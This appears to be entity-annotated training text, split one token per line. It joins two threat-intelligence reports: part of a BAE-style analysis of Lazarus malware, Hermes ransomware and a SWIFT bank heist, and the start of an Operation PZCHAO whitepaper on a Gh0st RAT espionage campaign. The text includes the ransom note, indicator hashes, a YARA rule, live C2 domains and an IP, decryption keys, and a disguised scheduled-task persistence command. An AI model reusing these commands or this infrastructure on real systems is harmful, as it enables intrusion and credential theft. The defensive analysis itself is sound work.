HERMES B_malware.ransom
2.1 I
RANSOMWARE I
radical I
edition I

All
your
important
files
are
encrypted

Your
files
has
been
encrypted
using
RSA2048
algorithm
with
unique
public-key
stored
on
your
PC
.

There
is
only
one
way
to
get
your
files
back
:
contact
with
us
,
pay
,
and
get
decryptor
software
.

You
have
'
UNIQUE_ID_DO_NOT_REMOVE
'
file
on
your
desktop
also
it
duplicated
in
some
folders
,
its
your
unique
idkey
,
attach
it
to
letter
when
contact
with
us
.
Also
you
can
decrypt
3
files
for
test
.

We
accept
Bitcoin
,
you
can
find
exchangers
on
https://www.bitcoin.com/buy-bitcoin B_url.normal
and
others
.

Contact
information
:
BM-2cVcZL1xfve1yGGKwEBgG1ge6xJ5PYGfGw@bitmessage.ch

reserve
:
BM-2cT4U1vBdjfqKDeWMEXgCWs9SfnMK1GLTF@bitmessage.ch

Malware
Analysis
–
Samples
#4
and
#6
,
Lazarus B_malware.unknown
malware I

5/10

Sample
#4
(
msmpeng.exe
)
is
packed
with
Themida
to
hamper
analysis
under
a
debugger
,
a
monitoring
application
,
or
a
virtual
machine
.

Once
fully
unpacked
in
memory
,
it
appears
to
be
an
x86
variant
of
the
fdsvc.dll B_malware.backdoor
backdoor
described
in
our
February
blogpost
'
Lazarus B_malware.unknown
' I
False I
Flag I
Malware I
' I
.

This
malware
was
discovered
on
networks
in
Poland
and
Mexico
,
following
a
series
of
watering-hole
attacks
.

Just
like
before
,
the
backdoor
uses
several
transliterated
Russian
words
to
either
indicate
the
state
of
its
communication
or
issue
backdoor
commands
:

Translation
from
Russian
Meaning
to
set
to
receive
to
send
beginning

State/Command

Nachalo
ustanavlivat
poluchit
pereslat
derzhat
vykhodit
kliyent2podklyuchit
client
to
connect
to
maintain
to
exit
start
communication
session
handshake
state
receive
data
send
data
maintain
communication
session
exit
communication
session
client
is
ready
to
connect

Sample
#6
(
splwow32.exe
)
is
the
same
backdoor
,
only
it's
not
packed
.

Both
sample
#4
and
#6
have
the
same
time
stamp
:
20
February
2017
,
11:09:30
.

It
appears
that
sample
#6
was
actually
obtained
by
packing
sample
#4
with
Themida
(
potentially
,
to
avoid
detection
)
,
as
code
/
data
found
in
both
samples
is
identical
.

The
backdoor
expects
a
command
line
parameter
that
specifies
remote
C&C
address
and
port
number
.

If
it
is
executed
with
no
command-line
parameters
,
it
quits
.

The
specified
command-line
parameter
is
decrypted
,
using
some
basic
character
manipulations
and
applying
XOR
with
2
keys
:

0x517A4563
(
'
QzEc
'
)

0x77506F66
(
'
wPof
'
)

The
decrypted
string
is
expected
to
delimit
C&C
address
and
port
number
with
the
'
:
'
character
.

Multiple
C&Cs
can
be
delimited
with
the
'
|
'
character
.

If
the
backdoor
finds
no
valid
pair
of
C&C
address
and
port
number
delimited
with
the
'
:
'
character
,
it
quits
.

Otherwise
,
it
starts
polling
the
remote
C&C
for
a
remote
task
to
execute
.

Each
polling
attempt
starts
from
a
state
'
Nachalo
'
(
'
start
communication
session
'
)
,
with
a
3
second
delay
between
each
attempt
to
connect
to
the
C&C
.

Each
connection
attempt
starts
from
a
state
called
'
kliyent2podklyuchit
'
(
'
client
is
ready
to
connect
'
)
.

If
the
backdoor
fails
to
connect
five
times
,
or
if
it
connects
,
but
the
task
it
receives
is
'
vykhodit
'
(
'
exit
communication
session
'
)
,
then
the
backdoor
will
quit
.

Otherwise
,
it
will
execute
the
remote
command
,
effectively
giving
the
attackers
full
control
over
the
compromised
system
.

After
the
execution
,
the
polling
cycle
continues
.

6/10

Malware
Analysis
–
Sample
#5

FileTokenBroker.dll
is
a
DLL
,
installed
as
a
service
under
the
svchost.exe
(
netsvcs
)
service
host
.

Once
loaded
as
a
service
DLL
,
the
DLL's
export
ServiceMain
(
)
is
called
.

The
DLL
then
constructs
a
file
name
that
consists
of
the
host
process
name
,
formatted
as
:

%SYSTEM%\en-US\[HOST_PROCESS_NAME_NO_EXTENSION].dll.mui

For
example
,
if
the
DLL
is
loaded
into
the
address
space
of
svchost.exe
,
the
constructed
filename
will
be
:

c:\windows\system32\en-US\svchost.dll.mui

Another
possible
name
is
:

c:\windows\system32\en-US\netsvc.dll.mui

The
DLL
then
reads
this
file
,
and
decrypts
it
with
a
running
XOR
mask
.

Once
decrypted
,
it
further
reads
an
RC4
key
from
it
,
and
decrypts
it
with
the
RC4
algorithm
.

The
decrypted
file
will
contain
a
hash
,
so
the
DLL
checks
the
hash
as
well
to
make
sure
the
integrity
of
the
decrypted
file
is
intact
.

A
fully
decrypted
file
is
then
parsed
as
a
PE
file
,
and
loaded
as
a
DLL
.

Hence
,
FileTokenBroker.dll
decrypts
and
executes
a
payload
that
is
created
by
an
external
dropper
or
is
implanted
by
the
attackers
.

The
%SYSTEM%\en-US
directory
will
have
multiple
system
files
in
it
,
so
it
is
chosen
to
blend
the
encrypted
payload
file
with
the
other
legitimate
system
files
.

Unlike
other
*.dll.mui
files
in
%SYSTEM%\en-US
directory
that
are
MZ
files
,
the
encrypted
payload
is
not
an
MZ
file
.

Malware
Analysis
–
Samples
#7
,
#8
,
and
#9
,
Further
Hermes B_malware.ransom
malware I

Samples
#7
,
#8
,
and
#9
relate
to
previous
instances
of
Hermes B_malware.ransom
ransomware I
.

Malware
of
this
category
is
typically
widespread
,
but
in
the
case
of
Hermes B_malware.ransom
it
seems
relatively
rare
.

This
is
suspicious
in
itself
and
reminds
us
of
WannaCry B_malware.ransom
–
another
rarely
observed
ransomware
.
Further
analysis
is
on-going
to
understand
the
history
of
this
malware
variant
.

Transactions

Through
working
with
trusted
partners
,
we
have
been
able
to
get
insight
into
the
transactions
made
as
part
of
the
heist
.

The
transactions
consisted
of
two
common
SWIFT
message
types
,
MT103
and
MT202COV
.

MT103
messages
are
used
for
normal
,
cross
border
,
cash
transfers
which
would
typically
request
funds
be
transferred
into
a
personal
or
company
beneficiary
account
.

MT103
messages
can
be
used
on
their
own
,
or
can
be
coupled
with
a
cover
message;
MT202COV
is
used
to
order
the
movement
of
funds
to
the
beneficiary
institution
via
another
financial
institution
/
Intermediary
Bank
.

In
this
heist
the
attackers
created
MT103
messages
to
transfer
funds
to
Cambodia
,
the
US
,
and
Sri
Lanka
.

In
addition
to
the
7/10

MT103
messages
,
the
attackers
created
MT202COV
messages;
the
content
of
these
messages
was
syntactically
correct
but
the
values
in
specific
fields
were
wrong
.

As
a
result
,
they
were
received
by
the
intermediary
bank
but
had
no
further
influence
on
the
funds
transferred
to
the
beneficiary
accounts
.

Reports
of
$60M
being
stolen
appear
to
be
due
to
confusion
over
these
latter
messages
,
and
the
amounts
actually
stolen
were
considerably
lower
.

Most
of
these
appear
to
have
been
recovered
.

Further
details
of
the
destination
accounts
within
Sri
Lanka
have
emerged
in
open
source
.

The
money
had
been
transferred
to
the
Bank
of
Ceylon
in
Sri
Lanka
on
3
October
.

The
following
day
,
an
individual
in
Sri
Lanka
allegedly
withdrew
RS
30m
(
about
$195K
)
.

Two
days
after
that
,
the
same
individual
returned
to
withdraw
a
further
RS
8m
,
but
was
arrested
when
he
arrived
at
the
bank
.

Sri
Lankan
police
have
since
arrested
another
individual
and
a
further
suspect
is
wanted
by
Sri
Lankan
law
enforcement
.

CONCLUSIONS

It
has
been
over
a
year
since
the
last
activity
on
a
payments
system
from
the
attackers
behind
the
infamous
Bangladesh
Bank
heist
.

Lazarus
,
the
prime
suspects
,
have
been
busy
nonetheless
–
targeting
Bitcoin
in
various
ways
,
as
well
as
other
intrusions
into
banks
such
as
in
Poland
and
Mexico
(
albeit
without
evidence
of
targeting
payment
systems
)
.

In
one
of
these
cases
we
and
other
researchers
were
able
to
observe
infrastructure
in
North
Korea
controlling
the
malware
–
further
clues
as
to
the
origins
of
these
attackers
.

The
attack
this
month
on
Taiwanese
Far
Eastern
International
Bank
has
some
of
the
hallmarks
of
the
Lazarus
group
:

•
Destination
beneficiary
accounts
in
Sri
Lanka
and
Cambodia
–
both
countries
have
been
used
previously
as
destinations
for
Lazarus
'
bank
heist
activity;

•
Use
of
malware
previously
seen
in
Lazarus
'
Poland
and
Mexico
bank
attacks
.

Where
these
files
were
found
and
the
context
of
their
use
needs
to
be
confirmed
,
but
could
provide
a
crucial
attributive
link;

•
Use
of
unusual
ransomware
,
potentially
as
a
distraction
.

Despite
their
continued
success
in
getting
onto
payment
systems
in
banks
,
the
Lazarus
group
still
struggle
getting
the
cash
in
the
end
,
with
payments
being
reversed
soon
after
the
attacks
are
uncovered
.

The
group
may
be
trying
new
tricks
to
disrupt
victims
and
delay
their
ability
to
respond
–
such
as
different
message
formats
,
and
the
deployment
of
ransomware
across
the
victim's
network
as
a
smokescreen
for
their
other
activity
.

It's
likely
they'll
continue
their
heist
attempts
against
banks
in
the
coming
months
and
we
expect
they
will
evolve
their
modus
operandi
to
incorporate
new
ways
of
disrupting
victims
(
and
possibly
the
wider
community
)
from
responding
.

More
work
needs
to
be
done
to
identify
how
FEIB
was
attacked
,
whether
further
custom
tools
were
involved
,
confirm
the
context
of
the
Lazarus B_malware.unknown
malware I
in
the
intrusion
,
and
where
else
this
Hermes
ransomware
has
been
seen
.

Assuming
Lazarus
are
indeed
back
to
targeting
bank
payment
systems
,
this
will
serve
to
emphasize
the
importance
of
network
hardening
and
controls
frameworks
being
pushed
by
the
industry
at
present
.

RECOMMENDATIONS

Some
general
network
hardening
and
monitoring
lessons
can
be
taken
from
this
:

•
Firewall
off
SMB
(
445
)
for
internal
computers
.

If
access
to
this
service
is
required
,
it
should
be
permitted
only
for
those
IP's
that
require
access
.

i.e.
445
is
required
for
SCOM
to
push
an
agent
install
,
therefore
445
should
only
be
allowed
from
that
source
server;

8/10

•
Application
blacklisting
should
be
implemented
to
prevent
the
use
of
tools
such
as
vssadmin.exe
,
cmd.exe
,
powershell.exe
and
similar;

•
File
Integrity
Monitoring
should
be
considered
and
configured
to
monitor
file
creations
in
'
trusted
'
locations
such
as
the
System32
directory
.

This
can
also
be
used
to
monitor
deletes
,
with
an
alert
configured
to
fire
on
excessive
deletes
in
a
row;

•
Windows
Security
Event
logs
should
be
monitored
to
capture
Scheduled
Task
creation
events
–
Event
ID
4698;

•
Registry
Auditing
should
be
enabled
and
monitored
to
capture
any
additions
to

HKLM\Software\Microsoft\Windows\CurrentVersion\Run;

•
Excessive
use
of
known
administrative
privilege
accounts
should
be
alerted
on
–
specifically
in
a
'
one
to
many
'
behavioural
configuration
.

i.e.
is
one
specific
IP
connecting
to
a
large
number
of
devices
using
the
same
credentials
in
a
short
period
of
time;

•
Ensure
privileged
accounts
have
a
complex
password
that
does
not
include
any
part
of
the
username
,
or
application
it
relates
to
.

Additional
longer
term
recommendations
for
financial
institutions
:

•
Practice
incident
response
scenarios
which
include
complex
attacks
combining
covert
payment
fraud
and
overt
network
disruption
through
ransomware
,
DDoS
,
network
downtime
,
etc
.

•
Ensure
that
you
are
progressing
towards
being
able
to
attest
against
the
SWIFT
27
controls
.

For
more
information
see
:
http://www.baesystems.com/en/cybersecurity/swift-customer-security-programme B_url.normal

APPENDIX
A
–
INDICATORS
OF
ATTACK

MD5
Hashes
d08f1211fe0138134e822e31a47ec5d4 B_hash
b27881f59c8d8cc529fa80a58709db36 B_hash
3c9e71400b72cc0213c9c3e4ab4df9df B_hash
0edbad9e6041d43f97c7369439a40138 B_hash
97aaf130cfa251e5207ea74b2558293d B_hash
62217af0299d6e241778adb849fd2823 B_hash
0dd7da89b7d1fe97e669f8b4156067c8 B_hash
61075faba222f97d3367866793f0907b B_hash

File
/
Process
name
bitsran.exe B_malware.drop

APPENDIX
B
–
YARA
RULE

9/10

rule
Hermes2_1 B_malware.ransom
{
meta
:

date
=
'
2017/10/11
'

author
=
'
BAE
'

hash
=
'
b27881f59c8d8cc529fa80a58709db36 B_hash
'

strings
:

$magic
=
{
4D
5A
}

//in
both
version
2.1
and
sample
in
Feb

$s1
=
'
SYSTEM\\CurrentControlSet\\Control\\Nls\\Language\\
'

$s2
=
'
0419
'

$s3
=
'
0422
'

$s4
=
'
0423
'

//in
version
2.1
only
$S1
=
'
HERMES B_malware.ransom
'

$S2
=
'
vssadminn
'

$S3
=
'
finish
work
'

$S4
=
'
testlib.dll
'

$S5
=
'
shadowstorageiet
'

//maybe
unique
in
the
file

$u1
=
'
ALKnvfoi4tbmiom3t40iomfr0i3t4jmvri3tb4mvi3btv3rgt4t777
'

$u2
=
'

HERMES B_malware.ransom
2.1 I
TEST
BUILD
,
press
ok
'

$u3
=
'
hnKwtMcOadHwnXutKHqPvpgfysFXfAFTcaDHNdCnktA
'

//RSA
Key
part

condition
:

$magic
at
0
and
all
of
(
$s*
)
and
3
of
(
$S*
)
and
1
of
(
$u*

)

10/10
Operation
PZCHAO B_malware.unknown

Inside
a
highly
specialized
espionage
infrastructure

Foreword

More
than
30
years
after
the
end
of
the
Cold
War
,
digital
infrastructures
worldwide
have
become
strategic
national
fronts
with
the
same
importance
as
the
geographical
frontiers
of
air
,
land
,
sea
and
space
.

At
the
same
time
,
cyber
-
attacks
are
growing
in
complexity
as
threat
actors
divide
payloads
in
multiple
modules
with
highly
specialized
uses
to
achieve
a
target's
compromise
.

The
past
few
years
have
seen
high
-
profile
cyber
-
attacks
shift
to
damaging
the
targets
'
digital
infrastructures
to
stealing
highly
sensitive
data
,
silently
monitoring
the
victim
and
constantly
laying
the
ground
for
a
new
wave
of
attacks
.

This
is
also
the
case
of
a
custom
-
built
piece
of
malware
that
we
have
been
monitoring
for
several
months
as
it
wrought
havoc
in
Asia
.

Our
threat
intelligence
systems
picked
up
the
fi
rst
indicators
of
compromise
in
July
last
year
,
and
we
have
kept
an
eye
on
the
threat
ever
since
.

An
interesting
feature
of
this
threat
,
which
drew
our
team
to
the
challenge
of
analyzing
it
,
is
that
it
features
a
network
of
malicious
subdomains
,
each
one
used
for
a
specifi
c
task
(
download
,
upload
,
RAT
related
actions
,
malware
DLL
delivery
)
.

The
payloads
are
diversified
and
include
capabilities
to
download
and
execute
additional
binary
files
,
collect
private
information
and
remotely
execute
commands
on
the
system
.

In
the
analysis
process
,
we
managed
to
retrieve
the
malware
payloads
hosted
on
one
of
the
command
and
control
servers
along
with
some
statistics
,
such
as
the
total
number
of
downloads
and
logs
containing
the
targeted
victims
.

Among
the
most
-
downloaded
malicious
files
,
we
found
variants
of
Gh0st B_malware.backdoor
RAT I
used
in
Iron
Tiger
APT
operation
.

Interestingly
enough
,
these
new
samples
now
connect
to
the
new
attack
infrastructure
.

This
whitepaper
takes
an
in-depth
look
at
the
the
attack
chain
,
the
infrastructure
used
by
the
threat
actors
,
the
malware
subdomains
they
control
and
the
payloads
delivered
on
the
targeted
systems
,
as
well
as
other
telltale
signs
about
a
possible
return
of
the
Iron
Tiger
APT
.

1
.
Victimology

Since
its
debut
,
this
malware
has
been
targeting
important
institutions
,
mainly
in
Asia
and
the
USA
,
the
victims
being
part
of
Government
sector
,
Technology
,
Education
and
Telecommunications
.

This
map
offers
a
simplified
view
of
the
location
and
nature
of
the
targets
.

Technology

Government

Education

Telecommunications

2
.
The
attack
chain

The
initial
point
of
compromise
seems
to
be
highly
targeted
spam
messages
with
a
malicious
VBS
file
attached
.

The
VBS
script
acts
as
a
downloader
for
further
malicious
payloads
from
a
distribution
server
,
as
shown
in
the
diagram
below
.

The
distribution
server
has
been
resolved
to
an
IP
address
located
in
South
Korea
as
of
July
17
2017
,
when
we
first
isolated
the
initial
payload
.

The
IP
address
'
125.7.152.55 B_ip.distribute
'
hosts
the
'
down.pzchao.com B_url.distribute
'
.

As
shown
in
the
diagram
below
,
new
components
are
downloaded
and
executed
on
the
compromised
hosts
in
every
stage
of
attack
.

2.1
.
Overview
of
the
malware
delivery
infrastructure

The
threat
actors
behind
the
attack
have
control
over
five
subdomains
of
the
'
pzchao.com B_url.unknown
'
domain
.

Suggestively
named
,
these
domains
serve
specific
functionalities
,
such
as
upload
,
download
and
RAT
related
communication
.

2.2
.
The
first
stage
payload
–
'
UP
'

One
sample
we
dug
from
the
malware
zoo
has
also
been
spotted
in
various
regions
in
Asia
.

It
consists
of
a
self-extracting
7zip
archive
(
SFX
)
which
,
when
extracted
,
writes
two
batch
scripts
(
up.bat
,
new.bat
)
to
disk
and
one
legitimate
application
called
curl.exe
.

This
payload
is
particular
to
Asia
,
as
the
messages
that
the
SFX
Install
Script
displays
as
part
of
the
setup
on
the
compromised
system
are
written
in
Chinese
.

The
malicious
batch
scripts
,
along
with
the
downloader
tool
,
are
dropped
in
the
%systemroot%\\temp
folder
.
The
fi
rst
bat
script
to
run
is
'
up.bat
'
and
is
set
in
the
'
RunProgram
'
variable
.

2.2.1
.
A
closer
look
at
up.bat

The
install
script
in
the
self-extracting
archive
executes
the
first
batch
script
dropped
on
the
system
.

This
script
called
'
up.bat
'
sits
in
the
temporary
folder
and
serves
four
main
purposes
:

It
renames
the
second
batch
script
from
tnew.bat
to
win32shell.bat;

Assigns
system
file
attributes
to
it;

Modifies
its
Access
Control
List
(
ACL
)
to
be
easily
controlled;

Kills
all
scheduled
tasks
that
might
interfere
with
the
sample
.

Some
of
these
tasks
include
legitimate
Adobe
services
as
well
as
legit
security
solutions
like
360.;

The
new
win32shell.bat
script
is
subsequently
scheduled
to
run
as
a
task
under
the
'
Adobe
Flash
Updates
'
name
every
other
day
at
3
AM
with
the
'
down
'
parameter
.

The
task
name
disguise
helps
keep
a
low
profile
and
evade
scrutiny
in
case
of
an
investigation
:

schtasks
/create
/tn
'
Adobe
Flash
Updaters
'
/tr
'
%systemroot%\temp\win32shell.bat
down
'
/sc
daily
/mo
2
/st
03:00:00
/ru
'
'

2.2.2
.
new.bat

The
'
new
'
batch
script
is
used
by
the
network's
operators
as
a
downloader
for
additional
companion
tools
,
as
well
as
to
upload
system
information
(
and
other
confidential
data
)
to
a
command
and
control
server
.

The
BAT
file
is
saved
in
the
%TEMP%
folder
as
'
win32shell.bat
'
.

2.2.3
.

The
upload
server
component
–
'
up.pzchao B_url.unknown
'

During
its
execution
,
win32shell.bat
contacts
the
command
and
control
server
at
up.pzchao.com:864/install.asp B_url.cncsvr
? I
to
send
a
fingerprint
of
the
system
.

The
information
is
passed
along
in
a
POST
request
made
by
another
batch
script
file
that
is
decrypted
and
dropped
by
win32
.
shell.bat
.

This
dropped
batch
script
is
called
'
360.bat
'
(
most
likely
because
of
its
resemblance
to
a
highly
popular
security
suite
in
China
)
and
sends
information
such
as
username
,
domain
,
MAC
address
,
OS
version
and
the
RDP
port
3389
status
via
a
POST
request
to
the
/
install.asp
script
.

The
request
is
sent
via
the
legitimate
application
curl.exe
that
gets
extracted
from
the
initial
7zip
archive
.

Once
the
script
finishes
profiling
the
infected
device
,
it
starts
uploading
confidential
information
,
such
as
passwords
.

Password
achievement
is
done
via
a
Mimikatz B_malware.unknown
implementation
downloaded
along
with
the
rest
of
the
files
.

This
POST
request
containing
the
password
is
sent
to
another
server-side
script
,
called
/upload864
.

This
information
is
scheduled
for
collection
and
exfiltration
every
week
at
3
AM
.

2.3
.

The
Download
Server
–
'
down.pzchao B_url.distribute
'

Win32shell.bat
contacts
the
download
server
at
'
down.pzchao.com B_url.distribute
'
to
request
the
four
additional
second-stage
payloads
that
are
discussed
in
detail
below
.

2.3.1
.

Second
stage
payloads

The
Bitcoin
Miner

The
first
payload
deployed
to
the
infected
system
is
a
self-extracting
7zip
archive
that
drops
a
set
of
miner
application
tools
for
Bitcoin
mining
.

The
original
installation
batch
script
ensures
that
the
miner
application
works
well
so
that
it
will
kill
all
scheduled
tasks
(
other
bitcoin
mining
applications
)
which
may
interfere
with
the
running
tool
.

Subsequently
,
it
identifies
the
operating
system
used
and
sets
the
corresponding
Bitcoin
miner
application
into
the
%TEMP%
system
folder
.

The
script
proceeds
to
create
a
service
called
named
wmiapsrv.exe
that
runs
a
BitcoinMinerPooling
Application
.

The
wmiapsrv32/64.exe
is
a
fake
application
set
as
a
service
,
which
runs
java
.
exe
(
the
actual
Bitcoin
miner
)
.

The
Bitcoin
miner
application
(
both
32-bit
and
64-bit
)
is
renamed
as
java.exe
and
used
for
bitcoin
mining
every
three
weeks
at
3
AM
.

The
Password
Stealer

To
harvest
passwords
from
the
target
system
,
the
malware
deploys
two
versions
of
the
Mimikatz B_malware.unknown
password-scraping
utility
for
both
operating
system
architectures
(
x86
,
x64
)
.

Mimikatz B_malware.unknown
comes
in
a
self-extracted
7zip
archive
also
and
,
once
extracted
,
it
drops
four
distinct
files
,
called
mimikatz.exe B_malware.unknown
,
mimilib.dll B_malware.unknown
,
mimidrv.sys B_malware.unknown
,
and
pass.bat B_malware.unknown
.

The
batch
script
executes
the
Mimikatz B_malware.unknown
binary I
.

Once
dumped
,
the
confidential
information
gets
uploaded
to
the
command
and
control
server
at
a
later
time
.

The
Remote
Access
Trojan B_malware.backdoor
component
(
Gh0st B_malware.backdoor
RAT I
)

The
last
payload
downloaded
is
a
slightly
modified
Gh0st B_malware.backdoor
RAT I
sample
designed
to
act
as
a
backdoor
implant
.

Its
behavior
is
very
similar
to
the
versions
detected
in
attacks
associated
with
the
Iron
Tiger
APT
group
.

This
executable
represents
the
'
dropper
'
-
a
Windows
application
that
contains
all
the
code
required
to
prepare
a
compromised
host
for
installation
of
the
Gh0st B_malware.backdoor
RAT
server
service
.

The
binary
that
is
decrypted
and
dropped
on
the
system
is
the
same
as
the
one
that
communicates
with
the
attacker's
endpoint
(
also
known
as
the
RAT B_malware.backdoor
client
or
the
C2
controller
)
on
startup
and
awaits
further
instructions
.

Once
this
service
is
installed
on
the
targeted
host
,
the
system
is
completely
compromised
,
as
it
has
a
vast
array
of
espionage
capabilities
(
including
Remote
Terminal
)
that
can
be
used
to
move
laterally
across
the
network
.

A
list
of
main
capabilities
,
along
with
a
short
description
,
are
shown
below
in
Table
1
.

Process
Explorer

Keystroke
Logger

Web
Cam
Eavesdropping

Voice
Monitoring

Session
Management

Remote
File
Downloads

Remote
Terminal

File
Manager

Listing
of
all
active
processes
and
opened
windows

Real-time
and
offline
remote
keystroke
logging

Live
video
feed
of
remote
web
camera
,
if
available

Remote
listening
using
microphone
if
available

Remote
shutdown
and
reboot
of
host

Ability
to
download
binaries
from
the
Internet
to
remote
host

Fully
functional
remote
shell

Complete
fi
le
explorer
capabilities
for
local
and
remote
hosts

The
Gh0st B_malware.backdoor
architecture
takes
advantage
of
the
ability
to
create
custom
Windows
resources
in
a
Windows
binary
.

This
mechanism
is
used
quite
often
by
malware
authors
,
as
it
is
extremely
convenient
for
attackers
to
create
custom
binaries
for
different
targets
.

Before
installation
of
the
main
communication
component
,
the
dropper
takes
several
actions
on
the
infected
system
:
it
will
first
call
the

GetInputState
(
)
function
that
verifies
if
there
are
mouse
or
keyboard
messages
in
the
calling
thread's
queue
being
followed
by
calls
to

PostThreadMessage
(
)
and
GetMessage
(
)
.

However
,
none
of
the
return
values
of
these
called
functions
are
processed
,
which
is
highly
specific
to
many
of
the
versions
of
Gh0st B_malware.backdoor
RAT I
we
have
seen
in
the
past
.

The
malware
then
searches
inside
its
own
binary
for
a
string
delimiter
SSSSSSS
,
returning
a
string
pointer
to
the
beginning
of
the
encrypted
configuration
string
.

The
delimiter
points
to
the
beginning
of
the
C2
hostname
:
port
pairs
.
The
application
searches
again
for
another
string
delimiter
AAAAAAA
.

This
time
the
marker
string
points
to
the
beginning
of
the
encrypted
server
service
name
.

If
the
configuration
strings
are
not
found
,
the
application
exits
.

The
encrypted
configurations
previously
located
will
be
decrypted
using
AES
.

It
will
then
ensure
that
only
one
instance
of
the
program
runs
at
a
given
moment
by
checking
for
the
presence
of
a
particular
mutex
on
the
system
.

Subsequently
,
the
payload
enables
its
automatic
execution
upon
every
system
startup
by
adding
the
path
of
the
executable
in
the
'
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
'
registry
key
.

It
also
registers
itself
as
a
system
service
by
adding
the
following
registry
keys
:

'
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Wsfbpy
sahblabg
'
'
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Maobeu
xqiyes
'
'
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Wsfbpy
sahblabg

ReleiceName
=
'
Oracle.exe
'
'

'
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Wsfbpy
sahblabg

ReleiceName
=
'
Maobeu
xqiyes
'
'

'
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Maobeu
xqiyes

ConnectGroup
=
'
'
'

'
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Maobeu
xqiyes

MarkTime
=
'
2017-10-19
17:21
'

These
steps
that
the
dropper
follows
to
install
the
RAT B_malware.backdoor
server
are
contained
within
a
try-except
block
,
which
makes
any
potential
error
terminate
the
execution
of
the
application
.

Along
with
the
server
binary
dropped
on
the
system
,
a
Visual
Basic
script
(
'
jingtisanmenxiachuanxiao.vbs
'
)
that
is
used
for
process
cleanup
is
also
written
in
the
current
folder
.

The
server's
binary
gets
extracted
from
its
own
resource
section
and
is
written
to
the
\Windows\System32
folder
with
the
name
of
the
installed
service
(
'
Oracle.exe
'
)
.

Finally
,
it
calls
StartService
(
)
to
execute
the
second
component
,
namely
the
RAT B_malware.backdoor
server
that
will
have
total
control
over
the
compromised
host
from
now
on
.

It
starts
to
communicate
with
the
C2
servers
and
await
instructions
.

Until
it
checks
in
with
its
C2
controller
,
the
RAT B_malware.backdoor
server
searches
for
the
encrypted
configuration
buffer
containing
the
C&Cs
that
will
get
decrypted
using
an
AES
key
derived
from
a
hardcoded
string
'
Mother360
'
.

The
C&C
servers
revealed
after
decryption
are
:
rat.pzchao.com B_url.cncsvr
–
used
for
sending
instructions

centuriosa.info B_url.cncsvr
–
used
for
sending
instructions

zl855.no-ip.info B_url.cncsvr
–
used
for
requesting
new
configuration
file
of
the
C2
servers

It
will
then
set
a
Windows
station
,
first
by
saving
the
current
station
by
calling
GetProcessWindowStation
(
)
then
creating
a
new
one
named
winsta0
by
calling
OpenWindowStation
(
)
.

This
happens
because
,
according
to
MSDN
,
'
Kernel
objects
are
securable
,
while
user
objects
and
GDI
objects
are
not
.

Therefore
,
in
order
to
provide
additional
security
,
user
interface
objects
are
managed
using
window
stations
and
desktops
,
which
themselves
are
securable
objects
.
'
.

It
verifies
if
an
instance
of
this
service
is
already
running
by
checking
if
a
global
instance
variable
is
not
'
null
'
.

Next
,
the
RAT B_malware.backdoor
calls
a
function
that
uses
the
decrypted
configuration
data
to
populate
the
following
fields
:
lpszHost
,
dwPort
,
lpszProxyHost
,
dwProxyPort
,
lpszProxyUser
,
lpszProxyPass
.

If
the
proxy
variables
exist
and
are
being
populated
,
the
socket
used
to
connect
to
the
C2
RAT B_malware.backdoor
client
gets
configured
to
use
the
PROXY_SOCKS
config
.

To
determine
how
long
the
server
has
been
connected
to
the
client
,
the
return
value
of
the
function
GetTickCount
(
)
gets
saved
.

The
first
check-in
to
the
client
consists
of
a
login
token
(
TOKEN_LOGIN
)
that
is
followed
by
the
data
encapsulated
in
a
'
LOGINDATA
'
structure
.

The
attacker
uses
this
initial
information
as
a
fingerprint
of
the
system
,
which
proves
extremely
useful
in
determining
the
importance
of
the
infected
target
and
its
potential
role
on
the
network
.

Once
the
attacker
receives
the
fingerprint
packet
,
it
is
decrypted
and
parsed
.

A
new
row
is
then
added
to
the
Connections
tab
grid
of
the
client
interface
and
the
details
of
the
server
host
are
populated
in
the
appropriate
fields
.

The
number
of
active
connections
displayed
on
the
Connections
tab
grid
status
bar
is
incremented
by
1
.

Once
the
handshake
is
completed
successfully
with
the
client
(
C2
)
,
the
RAT B_malware.backdoor
waits
for
commands
.

When
a
user
of
the
C2
client
needs
to
perform
an
action
on
a
server
from
a
compromised
host
,
a
Command
packet
containing
the
highlighted
capabilities
is
created
and
sent
.

Another
trick
that
helps
the
malware
fly
below
the
radar
is
to
change
the
C2
address
to
localhost
when
the
attacker
is
not
using
the
infrastructure
.

The
network
communication
between
the
Gh0st B_malware.backdoor
RAT I
C2
client
and
a
compromised
host
(
server
)
is
AES
encrypted
using
the
same
string
'
Mother360
'
to
derive
the
decryption
key
.

The
packets
passed
between
the
two
endpoints
consist
of
two
fields
,
but
lack
the
plaintext
header
that
was
typical
of
Gh0st B_malware.backdoor
RAT I
in
previous
versions
:

1
.
A
four-byte
integer
that
contains
the
size
in
bytes
of
the
entire
packet
.

2
.
A
variable-sized
packet
that
contains
the
packet
payload
AES
encrypted
.

The
client
sends
small
requests
-
packets
containing
commands
-
and
the
server
responds
to
those
commands
with
the
requested
data
.

The
two
endpoints
communicate
using
a
series
of
pre-defined
commands
.

After
the
four
byte
integer
that
represents
the
size
,
the
first
byte
of
the
packet
payload
contains
an
operation
code
.

There
are
three
types
of
codes
:
Commands
,
Tokens
,
and
Modes
.

In
the
source
code
,
these
codes
are
contained
in
a
large
enum
in
a
header
file
.

Command
codes
are
sent
by
the
attacker
instructing
the
victim
what
to
do
.

Examples
:

COMMAND_WEBCAM

COMMAND_SCREEN_SPY

COMMAND_KEYBOARD

COMMAND_AUDIO

COMMAND_SCREEN_BLOCK_INPUT

COMMAND_PSLIST

Token
codes
that
are
passed
between
the
two
endpoints
to
ensure
a
clear
protocol
of
the
data
being
sent
.

Examples
:

TOKEN_LOGIN

TOKEN_DRIVE_LIST

TOKEN_FILE_LIST

TOKEN_FIRST_SCREEN

TOKEN_AUDIO_DATA

Mode
codes
are
used
to
determine
in
what
circumstances
the
actions
will
be
executed
and
to
respond
to
specific
action
settings
accordingly
.

Examples
:

TRANSFER_MODE_NORMAL

TRANSFER_MODE_UPDATE

TRANSFER_MODE_CANCEL

All
these
capabilities
leave
no
doubt
about
the
tool's
initial
purpose
and
reach
into
the
compromised
device
.

It
allows
a
remote
attacker
to
take
full
